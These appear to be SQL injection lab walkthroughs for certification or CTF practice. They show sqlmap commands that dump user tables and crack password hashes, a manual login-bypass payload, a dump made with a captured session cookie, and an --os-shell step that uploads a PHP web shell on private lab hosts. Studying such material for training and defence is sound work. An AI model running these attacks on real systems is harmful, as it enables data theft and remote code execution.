# 13 SQLi — full walkthroughs

---

## Walkthrough 1: "Find the admin password in the DB behind http://10.10.10.5/product.php?id=1"

**Type:** GET-param SQLi | **Difficulty:** easy | **Time:** 3–5 min

1. Confirm:
   ```bash
   sqlmap -u "http://10.10.10.5/product.php?id=1" --batch
   ```
   Output: `Parameter 'id' is vulnerable`.
2. List DBs:
   ```bash
   sqlmap -u "http://10.10.10.5/product.php?id=1" --batch --dbs
   ```
   Output:
   ```
   available databases [3]:
   [*] information_schema
   [*] mysql
   [*] shopdb
   ```
3. Tables in `shopdb`:
   ```bash
   sqlmap -u "http://10.10.10.5/product.php?id=1" --batch -D shopdb --tables
   ```
   Finds: `users`, `products`, `orders`.
4. Dump `users`:
   ```bash
   sqlmap -u "http://10.10.10.5/product.php?id=1" --batch -D shopdb -T users --dump
   ```
   Output:
   ```
   | id | username | password          |
   | 1  | admin    | 5f4dcc3b5aa765... |
   ```
5. Sqlmap will auto-offer to crack the hash with its built-in wordlist → `password`.
6. **Answer:** `password`

---

## Walkthrough 2: "Bypass the login form at http://10.10.10.12/login.php using SQLi"

1. Open Burp, intercept the login POST, save as `req.txt`.
2. Run sqlmap:
   ```bash
   sqlmap -r req.txt --batch --dbs
   ```
3. If exploitable, sqlmap will confirm `username` or `password` is vulnerable.
4. For a straight bypass without dumping, use the payload manually in Burp Repeater:
   ```
   username=admin' OR 1=1-- -
   password=x
   ```
5. **Answer:** logged in as admin.

---

## Walkthrough 3: "Extract the flag from the `secrets` table (authenticated)"

The app requires a session cookie.

1. Log in normally in Firefox, grab `PHPSESSID` from DevTools → Storage → Cookies.
2. Run:
   ```bash
   sqlmap -u "http://10.10.10.20/view.php?id=1" \
     --cookie="PHPSESSID=9f8a..." \
     --batch -D ctfdb -T secrets --dump
   ```
3. Output:
   ```
   | id | flag                        |
   | 1  | CEH{sql1_1s_7h3_w4y}        |
   ```
4. **Answer:** `CEH{sql1_1s_7h3_w4y}`

**Gotcha:** if the session expires mid-dump, re-grab the cookie and re-run (sqlmap resumes from its session file).

---

## Walkthrough 4: "Get OS command execution via SQLi on 10.10.10.30"

1. Confirm basic injection first:
   ```bash
   sqlmap -u "http://10.10.10.30/item.php?id=1" --batch
   ```
2. Request an OS shell:
   ```bash
   sqlmap -u "http://10.10.10.30/item.php?id=1" --batch --os-shell
   ```
3. Sqlmap asks for webroot — try `/var/www/html` (Apache default). It uploads a PHP stager + shell.
4. You drop into:
   ```
   os-shell> id
   uid=33(www-data) gid=33(www-data)
   os-shell> whoami
   www-data
   ```
5. **Answer:** RCE as `www-data`.

**Requires:** MySQL + `FILE` privilege + writable webroot + you know the path. If any of these fail, fall back to `--file-read` + manual shell upload.
